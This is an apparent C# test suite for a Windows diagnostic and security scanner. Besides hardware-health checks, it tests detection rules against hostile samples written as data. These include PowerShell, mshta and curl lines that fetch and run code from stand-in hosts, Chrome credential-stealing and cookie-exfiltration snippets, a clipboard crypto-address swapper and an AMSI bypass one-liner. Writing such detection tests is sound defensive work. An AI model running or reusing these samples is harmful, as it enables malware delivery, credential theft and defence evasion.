using TriageKit.Core.Agent;
using TriageKit.Core.Checks;
using TriageKit.Core.Engine;
using Xunit;

namespace TriageKit.Tests;

/// <summary>Regression tests for the second independent review (false alarms on healthy hardware and history).</summary>
public class V12DoctorTests
{
    private static CheckContext Ctx() => new(new ScanOptions(), TriageKit.Core.Rules.Indicators.LoadBuiltIn(), new TriageKit.Core.Intel.FileIntelService());
    private static SensorsCheck.Reading R(string label, string kind, double v, double? min = null, double? max = null, double? avg = null, string group = "Board")
        => new("HWiNFO", group, label, kind, v, min, max, "", avg);
    private static readonly PcProfile Ryzen5 = new("AMD Ryzen 7 5800X 8-Core Processor", "AMD", false, false);
    private static readonly PcProfile Ryzen7950 = new("AMD Ryzen 9 7950X 16-Core Processor", "AMD", false, false);
    private static readonly PcProfile Ryzen7800X3D = new("AMD Ryzen 7 7800X3D 8-Core Processor", "AMD", false, false);
    private static readonly PcProfile Intel14 = new("13th Gen Intel(R) Core(TM) i9-14900K", "Intel", false, false);
    private static readonly PcProfile Laptop = new("Intel(R) Core(TM) i7-1260P", "Intel", true, false);
    private static readonly PcProfile Vm = new("Intel(R) Xeon(R)", "Intel", false, true);

    // ---- N1: RAM channels, every slot naming from the review's harness
    [Theory]
    [InlineData("Controller0-ChannelA-DIMM1", "BANK 0", "Controller1-ChannelA-DIMM1", "BANK 0", false)]   // MSI/ASRock/Gigabyte Intel, dual channel
    [InlineData("Channel0-DIMM0", "BANK 0", "Channel1-DIMM0", "BANK 1", false)]
    [InlineData("DIMM 0", "P0 CHANNEL A", "DIMM 0", "P0 CHANNEL B", false)]                                  // AMD
    [InlineData("DIMM_A2", "BANK 1", "DIMM_B2", "BANK 3", false)]                                            // ASUS, correct slots
    [InlineData("ChannelA-DIMM0", "BANK 0", "ChannelB-DIMM0", "BANK 2", false)]
    [InlineData("DIMM1", "", "DIMM3", "", false)]                                                            // not understood: say nothing
    [InlineData("DIMM A", "", "DIMM B", "", false)]
    [InlineData("DIMM 1", "CHANNEL 0", "DIMM 1", "CHANNEL 1", false)]
    [InlineData("SODIMM1", "ChannelA", "SODIMM2", "ChannelB", false)]
    [InlineData("Bottom - Slot 1 (left)", "BANK 0", "Bottom - Slot 2 (right)", "BANK 2", false)]
    [InlineData("XMM1", "BANK 0", "XMM3", "BANK 2", false)]
    [InlineData("CPU1_DIMM_A1", "NODE 1", "CPU1_DIMM_B1", "NODE 1", false)]
    [InlineData("DIMM_B1", "BANK 1", "DIMM_B2", "BANK 2", true)]                                             // really one channel
    [InlineData("Controller0-ChannelA-DIMM0", "BANK 0", "Controller0-ChannelA-DIMM1", "BANK 0", true)]       // really one channel
    [InlineData("ChannelA-DIMM0", "BANK 0", "ChannelA-DIMM1", "BANK 1", true)]
    public void SameChannelOnlyWhenItReallyIs(string s1, string b1, string s2, string b2, bool flagged)
    {
        var ctx = Ctx();
        HardwareSetupCheck.JudgeMemory(ctx, new() { new(16, "KF560C36-16", s1, b1, 8), new(16, "KF560C36-16", s2, b2, 8) }, Intel14);
        Assert.Equal(flagged, ctx.Findings.Any(f => f.RuleId == "perf.ram-same-channel"));
    }

    [Fact]
    public void RamAdviceIsSkippedWhereItCantBeFollowed()
    {
        var ctx = Ctx();
        HardwareSetupCheck.JudgeMemory(ctx, new() { new(8, "VIRTUAL", "DIMM 0", "", 0) }, Vm);                         // virtual machine
        HardwareSetupCheck.JudgeMemory(ctx, new() { new(16, "H58G56BK7BX068", "Motherboard", "", 0) }, Laptop);         // soldered
        HardwareSetupCheck.JudgeMemory(ctx, new() { new(8, "A", "ChannelA-DIMM0", "", 12), new(8, "B", "ChannelB-DIMM0", "", 12) }, Laptop);   // mixed on a laptop
        Assert.Empty(ctx.Findings);
        HardwareSetupCheck.JudgeMemory(ctx, new() { new(16, "A", "ChannelA-DIMM0", "", 12) }, Laptop);
        Assert.Contains(ctx.Findings, f => f.RuleId == "perf.ram-single-channel" && f.Severity == Severity.Low);
    }

    // ---- N2: CPU voltage by vendor, VID ignored
    [Fact]
    public void StockBoostVoltagesAreNotFlagged()
    {
        var ctx = Ctx();
        SensorsCheck.Judge(ctx, new() { R("Core 0 VID", "Voltage", 1.2, 0.9, 1.5), R("CPU Core Voltage (SVI2 TFN)", "Voltage", 1.1, 0.9, 1.506) }, Ryzen5, false);
        SensorsCheck.Judge(ctx, new() { R("Vcore", "Voltage", 1.2, 0.8, 1.52) }, Intel14, false);
        Assert.DoesNotContain(ctx.Findings, f => f.RuleId == "stability.cpu-voltage");
    }

    [Fact]
    public void HighVoltagesAreFlaggedLowUnlessThereAreCrashes()
    {
        var ctx = Ctx();
        SensorsCheck.Judge(ctx, new() { R("Vcore", "Voltage", 1.2, 0.8, 1.58) }, Intel14, false);
        Assert.Contains(ctx.Findings, f => f.RuleId == "stability.cpu-voltage" && f.Severity == Severity.Low && f.Recommendation.Contains("0x12B"));
        var ctx2 = Ctx();
        SensorsCheck.Judge(ctx2, new() { R("CPU Core Voltage (SVI3 TFN)", "Voltage", 1.2, 0.8, 1.53) }, Ryzen7950, true);
        Assert.Contains(ctx2.Findings, f => f.RuleId == "stability.cpu-voltage" && f.Severity == Severity.Medium && f.Recommendation.Contains("Precision Boost"));
    }

    // ---- N5: temperatures and rails
    [Fact]
    public void ByDesignTemperaturesAreNotFaults()
    {
        var ctx = Ctx();
        SensorsCheck.Judge(ctx, new()
        {
            R("CPU Package", "Temperature", 60, 30, 92),                                    // Intel limit is 100
            R("GPU Memory Junction Temperature", "Temperature", 90, 40, 104, group: "NVIDIA GeForce RTX 3080"),   // GDDR6X in spec
            R("GPU Hot Spot Temperature", "Temperature", 80, 40, 103, group: "NVIDIA GeForce RTX 3080"),
            R("GPU VRM Temperature", "Temperature", 90, 40, 105, group: "NVIDIA GeForce RTX 3080"),             // not the motherboard
            R("Drive Temperature 2", "Temperature", 60, 30, 76, group: "Samsung SSD 980 PRO"),                  // controller sensor
        }, Intel14, false);
        Assert.Empty(ctx.Findings);
    }

    [Fact]
    public void CpuTemperatureLimitDependsOnTheCpu()
    {
        var ryzen = Ctx();
        SensorsCheck.Judge(ryzen, new() { R("CPU (Tctl/Tdie)", "Temperature", 70, 35, 95) }, Ryzen7950, false);
        Assert.Contains(ryzen.Findings, f => f.RuleId == "perf.cpu-hot" && f.Severity == Severity.Low && f.Detail.Contains("designed"));
        var x3d = Ctx();
        SensorsCheck.Judge(x3d, new() { R("CPU (Tctl/Tdie)", "Temperature", 70, 35, 88) }, Ryzen7800X3D, false);
        Assert.Contains(x3d.Findings, f => f.RuleId == "perf.cpu-hot");
        var intel = Ctx();
        SensorsCheck.Judge(intel, new() { R("CPU Package", "Temperature", 70, 35, 100) }, Intel14, false);
        Assert.Contains(intel.Findings, f => f.RuleId == "perf.cpu-hot");
    }

    [Fact]
    public void RailsNeedSustainedDeviationAndImpossibleValuesAreSensorFaults()
    {
        var ctx = Ctx();
        SensorsCheck.Judge(ctx, new()
        {
            R("+12V", "Voltage", 12.05, 11.2, 12.1, avg: 12.0),     // one dip under load: sensor noise, current and average fine
            R("+5V Standby", "Voltage", 5.28, 5.2, 5.3, avg: 5.28), // standby rail: not judged
            R("+3.3V", "Voltage", 2.0, 2.0, 2.0, avg: 2.0),         // mis-scaled
        }, Intel14, false);
        Assert.DoesNotContain(ctx.Findings, f => f.RuleId == "stability.psu-rail");
        Assert.Contains(ctx.Findings, f => f.RuleId == "stability.psu-rail-sensor" && f.Severity == Severity.Info);

        var bad = Ctx();
        SensorsCheck.Judge(bad, new() { R("+12V", "Voltage", 11.3, 11.1, 11.5, avg: 11.32), R("+12V", "Voltage", 10.1, 10.1, 10.2, avg: 10.1, group: "Other board sensor") }, Intel14, false);
        Assert.Contains(bad.Findings, f => f.RuleId == "stability.psu-rail" && f.Severity == Severity.Low);
        Assert.Contains(bad.Findings, f => f.RuleId == "stability.psu-rail-sensor");
        var crashes = Ctx();
        SensorsCheck.Judge(crashes, new() { R("+12V", "Voltage", 11.3, 11.1, 11.5, avg: 11.32) }, Intel14, true);
        Assert.Contains(crashes.Findings, f => f.RuleId == "stability.psu-rail" && f.Severity == Severity.Medium);
    }

    [Fact]
    public void HwinfoThermalThrottlingFlagIsUsed()
    {
        var ctx = Ctx();
        SensorsCheck.Judge(ctx, new() { R("Package/Ring Thermal Throttling", "Flag", 0, 0, 1) }, Intel14, false);
        Assert.Contains(ctx.Findings, f => f.RuleId == "perf.cpu-throttle");
    }

    // ---- N12 / N14: monitors and NVIDIA
    [Fact]
    public void MonitorNamesComeFromTheEdid()
    {
        var edid = new Dictionary<string, string> { ["GSM5B7F"] = "LG ULTRAGEAR" };
        Assert.Equal("LG ULTRAGEAR", HardwareSetupCheck.MonitorName(@"MONITOR\GSM5B7F\{4d36e96e-e325-11ce-bfc1-08002be10318}\0001", "Generic PnP Monitor", edid, 1));
        Assert.Equal("Screen 2", HardwareSetupCheck.MonitorName(@"MONITOR\DEL1234\{x}\0002", "Generic PnP Monitor", edid, 2));
        Assert.Equal("Dell U2720Q", HardwareSetupCheck.MonitorName(null, "Dell U2720Q", edid, 3));
    }

    [Fact]
    public void NvidiaPowerBrakeIsOneFindingAndX8IsLow()
    {
        var g = HardwareSetupCheck.ParseNvidia("NVIDIA GeForce RTX 4080, 55, 80.5, 320.00, 2505, 3105, 4, 4, 8, 16, 30, 12, 0x0000000000000088")!;
        Assert.Equal(0x88UL, g.Reasons);
        var ctx = Ctx();
        HardwareSetupCheck.JudgeNvidia(ctx, g, Intel14);
        Assert.Single(ctx.Findings, f => f.RuleId == "stability.gpu-power-brake");
        Assert.DoesNotContain(ctx.Findings, f => f.RuleId == "perf.gpu-throttle");
        Assert.Contains(ctx.Findings, f => f.RuleId == "perf.gpu-pcie-width" && f.Severity == Severity.Low);
        // Older drivers without the reasons field still parse.
        Assert.NotNull(HardwareSetupCheck.ParseNvidia("NVIDIA GeForce GTX 1060, 40, 10, 120, 139, 1911, 1, 3, 16, 16, 0, 1"));
    }

    [Theory]
    [InlineData("0 C:", "C:", true)]
    [InlineData("1 D: E:", "E:", true)]
    [InlineData("1 D: E:", "C:", false)]
    [InlineData("_Total", "C:", false)]
    public void LiveDiskOnlyJudgesTheWindowsDisk(string instance, string drive, bool holds) => Assert.Equal(holds, LivePerformanceCheck.DiskHolds(instance, drive));

    [Fact]
    public void AmdDesktopGenerationsAreRecognised()
    {
        Assert.True(Ryzen7950.Am5);
        Assert.True(Ryzen7800X3D.Am5 && Ryzen7800X3D.X3D);
        Assert.False(Ryzen5.Am5);
        Assert.False(new PcProfile("AMD Ryzen 7 7840HS w/ Radeon 780M Graphics", "AMD", false, false).Am5);
        Assert.Equal(1.55, Intel14.CoreVoltageLimit);
        Assert.Equal(1.50, Ryzen7950.CoreVoltageLimit);
    }
}

public class V12ScanTests
{
    // ---- N3: Run box
    [Theory]
    [InlineData("https://dash.cloudflare.com/login", null)]
    [InlineData("https://www.google.com/recaptcha/admin", null)]
    [InlineData("cmd /c D:\\firmware\\update.bat", null)]
    [InlineData("powershell -Command Restart-Computer -Confirm:$false", null)]
    [InlineData("powershell -ExecutionPolicy Bypass -File \"C:\\Users\\me\\Documents\\Scripts\\backup-my-photos-to-the-nas-every-evening.ps1\"", null)]
    [InlineData("msiexec /i \"C:\\Users\\me\\Downloads\\Very Long Product Name Setup 2026.11.3 x64 English.msi\"", null)]
    [InlineData("powershell -w hidden -c \"iwr https://evil.example/a.ps1 | iex\"", Severity.High)]
    [InlineData("mshta https://evil.example/v.hta # I am not a robot - Verification ID: 4821", Severity.High)]
    [InlineData("cmd /c curl -s https://x.example/p -o %TEMP%\\p.exe & start %TEMP%\\p.exe", Severity.High)]
    [InlineData("powershell -nop -c \"$c='JABjAD0A'; # ✅ Cloudflare human verification\"", Severity.High)]
    [InlineData("powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", Severity.Medium)]
    [InlineData("curl https://example.com/file.zip -o file.zip", Severity.Low)]
    // Review 3 (V8): obfuscated and less common shapes
    [InlineData("cmd /c \"m^sh^ta ht^tps://evil.example/a\"", Severity.High)]
    [InlineData("powershell -eC SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", Severity.Medium)]
    [InlineData("powershell /e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", Severity.Medium)]
    [InlineData("wscript \\\\files.example@80\\s\\a.js", Severity.High)]
    [InlineData("\\\\cdn.example@SSL\\DavWWWRoot\\setup.exe", Severity.High)]
    [InlineData("mshta evil.example/a.hta", Severity.High)]
    [InlineData("cmd /c finger user@evil.example | cmd", Severity.High)]
    [InlineData("hh.exe https://evil.example/x.chm", Severity.High)]
    [InlineData("\"pow\"+\"ershell\" -c \"iwr https://evil.example/a | iex\"", Severity.High)]
    [InlineData("msiexec /i \\\\fileserver\\deploy\\app.msi /qn", null)]
    [InlineData("rundll32 printui.dll,PrintUIEntry /in /n \\\\printsrv\\hp", null)]
    [InlineData("cmd /c C:\\Tools\\Cloudflare\\warp-diag.exe", null)]
    public void RunBoxEntriesAreJudgedWithoutFalseAlarms(string cmd, Severity? expected) => Assert.Equal(expected, RunHistoryCheck.Assess(cmd));

    // ---- N7: identity of measured findings
    [Fact]
    public void MeasuredTitlesKeepTheirIdentity()
    {
        Finding F(string title) => new() { Severity = Severity.Low, Category = "Performance", Title = title, RuleId = "perf.cpu-hot" };
        Assert.Equal(FindingFingerprint.Of(F("CPU reached 95 °C")), FindingFingerprint.Of(F("CPU reached 97 °C")));
        Assert.Equal(FindingFingerprint.Of(F("Driver latency 4.1%")), FindingFingerprint.Of(F("Driver latency 5,3%")));
        Finding S(string title) => new() { Severity = Severity.High, Category = "Persistence", Title = title, RuleId = "persistence.run-key" };
        Assert.NotEqual(FindingFingerprint.Of(S("Risky autostart entry: app1")), FindingFingerprint.Of(S("Risky autostart entry: app2")));
        // The subject keeps its digits, and a worse severity is a new finding (review 3, V4).
        Finding G(string title, Severity sev = Severity.Low) => new() { Severity = sev, Category = "Performance", Title = title, RuleId = "perf.gpu-hot" };
        Assert.Equal(FindingFingerprint.Of(G("Graphics card is hot (88 °C): RTX 4080")), FindingFingerprint.Of(G("Graphics card is hot (91 °C): RTX 4080")));
        Assert.NotEqual(FindingFingerprint.Of(G("Graphics card is hot (88 °C): RTX 4080")), FindingFingerprint.Of(G("Graphics card is hot (88 °C): RTX 3080")));
        Assert.NotEqual(FindingFingerprint.Of(G("Graphics card is hot (88 °C): RTX 4080")), FindingFingerprint.Of(G("Graphics card is hot (95 °C): RTX 4080", Severity.Medium)));
        Finding H(string title) => new() { Severity = Severity.Low, Category = "Performance", Title = title, RuleId = "perf.cpu-hog" };
        Assert.NotEqual(FindingFingerprint.Of(H("xmrig64 uses a lot of CPU in the background")), FindingFingerprint.Of(H("xmrig32 uses a lot of CPU in the background")));
        Finding B(string title) => new() { Severity = Severity.High, Category = "Stability", Title = title, RuleId = "doctor.bsod" };
        Assert.NotEqual(FindingFingerprint.Of(B("2 blue screens in the last 30 days")), FindingFingerprint.Of(B("14 blue screens in the last 30 days")));
    }

    // ---- truth audit: a Medium is never "Looks clean"
    [Fact]
    public void MediumFindingsAreNeverLooksClean()
    {
        Finding F(Severity s, string id) => new() { Severity = s, Category = "x", Title = id, RuleId = id };
        var (score, verdict) = Scoring.Calculate(new[] { F(Severity.Medium, "a"), F(Severity.Medium, "b"), F(Severity.Medium, "c") });
        Assert.Equal("Needs attention", verdict);
        Assert.True(score <= 84);
        Assert.Equal("Looks clean", Scoring.Calculate(new[] { F(Severity.Low, "a") }).Verdict);
    }

    // ---- N6: what may and may not block a clean verdict
    private sealed class FakeCheck : ICheck
    {
        private readonly Action<CheckContext> _run;
        public FakeCheck(string name, string module, Action<CheckContext> run) { Name = name; Module = module; _run = run; }
        public string Name { get; }
        public string Module { get; }
        public object? Run(CheckContext ctx) { _run(ctx); return null; }
    }

    private static ScanResult Scan(params ICheck[] checks)
    {
        var opts = new ScanOptions { Elevated = true, Parallelism = 1, Modules = new(StringComparer.OrdinalIgnoreCase) { "security", "doctor" } };
        var ctx = new CheckContext(opts, TriageKit.Core.Rules.Indicators.LoadBuiltIn(), new TriageKit.Core.Intel.FileIntelService());
        return new Scanner(checks).Run(ctx, new ScanMeta());
    }

    [Fact]
    public void MinorGapsAndDoctorProblemsDontBlockACleanSecurityResult()
    {
        var r = Scan(
            new FakeCheck("files", "security", _ => CheckContext.Minor("Only the first 300 matching files in AppData were checked")),
            new FakeCheck("live", "doctor", c => { CheckContext.Note("Windows performance counters are unavailable"); c.Add(Severity.Medium, "Performance", "Slow disk", ruleId: "perf.disk-latency"); }));
        Assert.True(r.Verdict == "Looks clean", string.Join(" | ", r.Findings.Select(f => $"{f.Severity} {f.RuleId} {f.Module}")));
        Assert.Contains(r.Findings, f => f.RuleId == "collector.minor");
        Assert.DoesNotContain(r.Findings, f => f.RuleId == "collector.partial");
        Assert.Contains(r.Findings, f => f.RuleId == "perf.disk-latency" && f.Module == "doctor");
    }

    [Fact]
    public void MaterialSecurityGapsStillBlockACleanResult()
    {
        var r = Scan(new FakeCheck("events", "security", _ => CheckContext.Note("Event log 'Security' could not be read")));
        Assert.Equal("Incomplete check", r.Verdict);
        Assert.Contains(r.Findings, f => f.RuleId == "collector.partial");
    }

    [Fact]
    public void ChecksRunWithInvariantNumbers()
    {
        var previous = Thread.CurrentThread.CurrentCulture;
        try
        {
            Thread.CurrentThread.CurrentCulture = new System.Globalization.CultureInfo("hr-HR");
            var r = Scan(new FakeCheck("n", "security", c => c.Add(Severity.Low, "x", $"Value {4.5:0.0}", ruleId: "t.n")));
            Assert.Contains(r.Findings, f => f.Title == "Value 4.5");
        }
        finally { Thread.CurrentThread.CurrentCulture = previous; }
    }
}

public class V122Tests
{
    private static CheckContext Ctx() => new(new ScanOptions(), TriageKit.Core.Rules.Indicators.LoadBuiltIn(), new TriageKit.Core.Intel.FileIntelService());

    [Fact]
    public void FakeMicrosoftSignerIsNotMicrosoft()
    {
        var real = new TriageKit.Core.Intel.FileIntel { Path = "x.exe", SignatureStatus = TriageKit.Core.Intel.SignatureStatus.Valid, Signer = "Microsoft Windows" };
        var fake = new TriageKit.Core.Intel.FileIntel { Path = "x.exe", SignatureStatus = TriageKit.Core.Intel.SignatureStatus.Valid, Signer = "Microsoft Update Services Ltd" + TriageKit.Core.Intel.Authenticode.NotMicrosoftIssued };
        Assert.True(real.IsMicrosoft);
        Assert.False(fake.IsMicrosoft);
    }

    [Theory]
    [InlineData("Machine", "CyberHop Root CA", -2000, Severity.Low)]
    [InlineData("Machine", "nkjtfcvQ42U", -400, Severity.Medium)]        // random-looking name
    [InlineData("Machine", "Corp Proxy CA", -10, Severity.Medium)]       // added recently
    [InlineData("User (current)", "Some CA", -2000, Severity.Medium)]
    public void UnknownRootsAreGradedByRisk(string store, string subject, int days, Severity expected)
        => Assert.Equal(expected, CertificateCheck.UnknownRootSeverity(store, subject, DateTime.Now.AddDays(days)));

    [Fact]
    public void TwoSocketBoardsAreNotOneChannel()
    {
        Assert.NotEqual(HardwareSetupCheck.ChannelOf("CPU1_DIMM_A1", "NODE 1"), HardwareSetupCheck.ChannelOf("CPU2_DIMM_A1", "NODE 2"));
        Assert.Equal(HardwareSetupCheck.ChannelOf("DIMM 1", "P0 CHANNEL A"), HardwareSetupCheck.ChannelOf("DIMM 2", "P0 CHANNEL A"));
    }

    [Fact]
    public void LaptopGraphicsLanesAreByDesign()
    {
        var ctx = Ctx();
        HardwareSetupCheck.JudgePcieWidth(ctx, "RTX 4060 Laptop GPU", 4, 8, new PcProfile("Intel Core i7-13700H", "Intel", true, false));
        Assert.Single(ctx.Findings, f => f.Severity == Severity.Low && !f.Recommendation.Contains("slot"));
    }

    [Fact]
    public void BusyInterruptCoreAloneIsNotStutter()
        => Assert.True(DoctorLimits.CoreLatencyLow > 28);   // 0.8% total with core 0 at 28% (real 7900X3D result) must stay quiet
}

public class AccountTheftTests
{
    private static CheckContext Ctx() => new(new ScanOptions(), TriageKit.Core.Rules.Indicators.LoadBuiltIn(), new TriageKit.Core.Intel.FileIntelService());

    [Theory]
    [InlineData("\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\"", "--remote-debugging-port=9222 --profile-directory=Default", true)]
    [InlineData("C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", "--load-extension=C:\\Users\\a\\AppData\\Local\\Temp\\x", true)]
    [InlineData("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "--profile-directory=\"Profile 1\"", false)]
    [InlineData("C:\\Program Files\\Notepad++\\notepad++.exe", "--remote-debugging-port=1", false)]
    public void BrowserDumpFlagsAreRecognised(string target, string args, bool dangerous)
        => Assert.Equal(dangerous, SessionTheftCheck.BrowserExe.IsMatch(target.Trim('"')) && SessionTheftCheck.DumpFlags.IsMatch(args));

    [Fact]
    public void HostsRedirectsOfGamingSitesAreHigh()
    {
        var ctx = Ctx(); var rows = new List<object>();
        GamingAccounts.Hosts(ctx, rows, new[] { "# comment steamcommunity.com", "185.12.4.9 steamcommunity.com www.steamcommunity.com", "0.0.0.0 telemetry.example.com", "127.0.0.1 discord.com", "10.0.0.5 nas.local" });
        Assert.Single(ctx.Findings, f => f.RuleId == "gaming.hosts-redirect");   // both names grouped into one finding
        Assert.Single(ctx.Findings, f => f.RuleId == "gaming.hosts-local");
        Assert.Equal(2, ctx.Findings.Count);
        var lan = Ctx(); GamingAccounts.Hosts(lan, new List<object>(), new[] { "192.168.1.10 lancache.steampowered.com", "127.0.0.2 steamcommunity.com", "1.2.3.4 steamcommunity.com.evil.example" });
        Assert.Single(lan.Findings, f => f.RuleId == "gaming.hosts-lan" && f.Severity == Severity.Medium);
        Assert.Single(lan.Findings, f => f.RuleId == "gaming.hosts-local");
        Assert.DoesNotContain(lan.Findings, f => f.RuleId == "gaming.hosts-redirect");
    }

    [Fact]
    public void StealerFoldersAndSessionCopiesAreFound()
    {
        var root = Path.Combine(Path.GetTempPath(), "tk-" + Guid.NewGuid().ToString("N"), "Temp");
        try
        {
            var log = Directory.CreateDirectory(Path.Combine(root, "8F2A11", "Log"));
            File.WriteAllText(Path.Combine(log.FullName, "Passwords.txt"), "x");
            File.WriteAllText(Path.Combine(log.FullName, "UserInformation.txt"), "x");
            Directory.CreateDirectory(Path.Combine(log.FullName, "Wallets"));
            var copy = Directory.CreateDirectory(Path.Combine(root, "tmp1"));
            File.WriteAllBytes(Path.Combine(copy.FullName, "Login Data"), System.Text.Encoding.ASCII.GetBytes("SQLite format 3\0" + new string('x', 100)));
            File.WriteAllText(Path.Combine(root, "Cookies.txt"), "x");                            // stealer output straight in the Temp root
            File.WriteAllBytes(Path.Combine(root, "Loginvault.db"), System.Text.Encoding.ASCII.GetBytes("SQLite format 3\0" + new string('x', 100)));
            var auto = Directory.CreateDirectory(Path.Combine(root, "puppeteer_dev_chrome_profile-AbC", "Default"));   // empty automation profile
            File.WriteAllText(Path.Combine(auto.Parent!.FullName, "Local State"), "{}");
            File.WriteAllText(Path.Combine(auto.Parent!.FullName, "First Run"), "");
            File.WriteAllBytes(Path.Combine(auto.FullName, "Login Data"), System.Text.Encoding.ASCII.GetBytes("SQLite format 3\0" + new string('x', 100)));
            var launcher = Directory.CreateDirectory(Path.Combine(root, "Launcher", "integrations"));   // app folder with generic names only
            foreach (var d in new[] { "Discord", "Steam", "Telegram" }) Directory.CreateDirectory(Path.Combine(launcher.FullName, d));
            var benign = Directory.CreateDirectory(Path.Combine(root, "notes"));
            File.WriteAllText(Path.Combine(benign.FullName, "Passwords.txt"), "my list");   // one marker alone isn't a stealer log
            var ctx = Ctx(); var rows = new List<object>();
            SessionTheftCheck.StealerLeftovers(ctx, rows, new[] { root });
            Assert.Single(ctx.Findings, f => f.RuleId == "session.stealer-folder");
            Assert.Equal(2, ctx.Findings.Count(f => f.RuleId == "session.copied"));   // tmp1 and the Temp root itself; not the empty puppeteer profile
            Assert.DoesNotContain(ctx.Findings, f => f.Detail.Contains("puppeteer") || f.Detail.Contains("integrations"));
            Assert.All(ctx.Findings, f => Assert.Contains("Sign out", f.Recommendation, StringComparison.OrdinalIgnoreCase));
        }
        finally { try { Directory.Delete(Path.GetDirectoryName(root)!, true); } catch { } }
    }
}

public class NewRuleTests
{
    private static List<string> Match(string text)
    {
        var scanner = new TriageKit.Core.Yara.YaraScanner(TriageKit.Core.Yara.YaraRuleSet.LoadBuiltIn());
        return scanner.Scan(System.Text.Encoding.ASCII.GetBytes(text)).Select(m => m.Rule.Name).ToList();
    }

    [Fact]
    public void StealerAndClipperRulesFireOnlyOnTheCombination()
    {
        // Python source with doubled backslashes, the way real stealers are written (review 0.13, C2).
        var py = "import sqlite3, shutil\npath = os.getenv('LOCALAPPDATA') + '\\\\Google\\\\Chrome\\\\User Data\\\\Local State'\nkey = json['os_crypt']['encrypted_key']\nwin32crypt.CryptUnprotectData(key)\nshutil.copy(base + '\\\\Default\\\\Login Data', tmp)\nw = appdata + '\\\\Electrum\\\\wallets'\nt = appdata + '\\\\Telegram Desktop\\\\tdata\\\\'";
        Assert.Contains("Stealer_Script_Browser_And_Apps", Match(py));
        Assert.DoesNotContain("Stealer_Script_Browser_And_Apps", Match("Login Data|encrypted_key|Local State|CryptUnprotectData|sqlite3"));   // a browser tool alone
        Assert.DoesNotContain("Stealer_Script_Browser_And_Apps", Match("metadata testdata lossfn Login Data encrypted_key Local State sqlite3"));   // short tokens inside words
        Assert.Contains("Clipper_Script_Crypto_Address_Swap", Match("while True: t = pyperclip.paste()\nif re.match('^(bc1|[13])[a-km-zA-HJ-NP-Z1-9]{25,34}$', t): pyperclip.copy(mine)"));
        Assert.Contains("Clipper_Script_Crypto_Address_Swap", Match("$c = Get-Clipboard; if ($c -match '0x[a-fA-F0-9]{40}' -or $c -match 'T[A-Za-z1-9]{33}') { Set-Clipboard $w }"));
        Assert.DoesNotContain("Clipper_Script_Crypto_Address_Swap", Match("git log | Set-Clipboard  # sha [a-fA-F0-9]{40} Get-Clipboard"));   // hash helper
        Assert.Contains("Stealer_Browser_Debugging_Cookie_Dump", Match("chrome.exe --headless --user-data-dir=x --remote-debugging-port=9222 ... ws = get('/json/version')['webSocketDebuggerUrl']; send('Network.getAllCookies')"));
        Assert.Contains("Stealer_Roblox_Cookie_Logger", Match("c = cookies['.ROBLOSECURITY']; requests.post(hook, json={'c': c})"));
        // AMSI: the runtime's own imports are not a bypass (real-PC false positive on coreclr.dll / singlefilehost.exe).
        var pe = "MZ" + new string('\0', 62) + "AmsiScanBuffer VirtualProtect GetProcAddress System.Management.Automation amsiInitFailed";
        Assert.DoesNotContain("Defense_Evasion_AMSI_Bypass", Match(pe));
        Assert.Contains("Defense_Evasion_AMSI_Bypass", Match("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"));
    }
}

public class AccountTheftNamingTests
{
    [Theory]
    [InlineData("chromedriver.exe", false)]
    [InlineData("ChromeCacheView.exe", false)]
    [InlineData("chrome.exe", false)]
    [InlineData("VALORANT Tracker.exe", false)]
    [InlineData("TelegramDesktopPortable.exe", false)]
    [InlineData("ChromeSetup.exe", true)]
    [InlineData("SteamSetup.exe", true)]
    [InlineData("TeamViewerQS.exe", true)]
    [InlineData("Install VALORANT.exe", true)]
    [InlineData("tsetup-x64.5.8.3.exe", true)]
    public void InstallerNamesAreSpecific(string file, bool known) => Assert.Equal(known, GamingAccounts.Installers.Any(i => i.Name.IsMatch(file)));

    [Theory]
    [InlineData("bootloader-flash", false)]
    [InlineData("TypingTrainer", false)]
    [InlineData("HackTheBox-vpn", false)]
    [InlineData("downloader", false)]
    [InlineData("esp-idf-tools-setup", false)]
    [InlineData("Hackintool", false)]
    [InlineData("roblox-executor", true)]
    [InlineData("Fortnite Aimbot", true)]
    [InlineData("free-robux-generator", true)]
    [InlineData("cs2_loader", true)]
    public void CheatNamesUseWholeWords(string name, bool cheat) => Assert.Equal(cheat, GamingAccounts.CheatName.IsMatch(name));

    [Theory]
    [InlineData("chrome.exe --type=renderer --remote-debugging-port=0", true)]
    [InlineData("chrome.exe --remote-debugging-port=9222 about:blank#--type=x", false)]
    public void ChildProcessSwitchIsReal(string cmd, bool child) => Assert.Equal(child, SessionTheftCheck.ChildProcess.IsMatch(cmd));

    [Fact]
    public void UnpackedExtensionsComeFromPreferences()
    {
        var dir = Directory.CreateTempSubdirectory("tkprof").FullName;
        try
        {
            File.WriteAllText(Path.Combine(dir, "Secure Preferences"), """
              {"extensions":{"settings":{
                "aaaa":{"location":1,"path":"aaaa\\1.0_0","manifest":{"name":"Store one"}},
                "bbbb":{"location":4,"path":"C:\\Users\\a\\AppData\\Local\\xyz","manifest":{"name":"Helper"}},
                "cccc":{"location":5,"path":"C:\\Program Files\\Google\\Chrome\\Application\\157.0.8103.51\\resources\\pdf","manifest":{"name":"Chrome PDF Viewer"}},
                "dddd":{"location":10,"path":"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\100.0.1185.36\\resources\\edge_feedback","manifest":{"name":"Edge Feedback"}},
                "eeee":{"location":5,"path":"C:\\Users\\a\\AppData\\Roaming\\x\\ext","manifest":{"name":"Fake component"}},
                "ffff":{"location":8,"path":"C:\\Temp\\cmd","manifest":{"name":"Command line"}}}}}
              """);
            var names = SessionTheftCheck.UnpackedExtensions(dir).Select(x => x.Name).OrderBy(x => x).ToList();
            Assert.Equal(new[] { "Command line", "Fake component", "Helper" }, names);   // browser components in their own resources folder are not reported
        }
        finally { Directory.Delete(dir, true); }
    }
}

public class ReadinessNoiseTests
{
    [Theory]
    [InlineData("setup.exe", false)]                                 // programs in downloads are normal; malware rules judge them
    [InlineData("HWiNFO64.exe", false)]
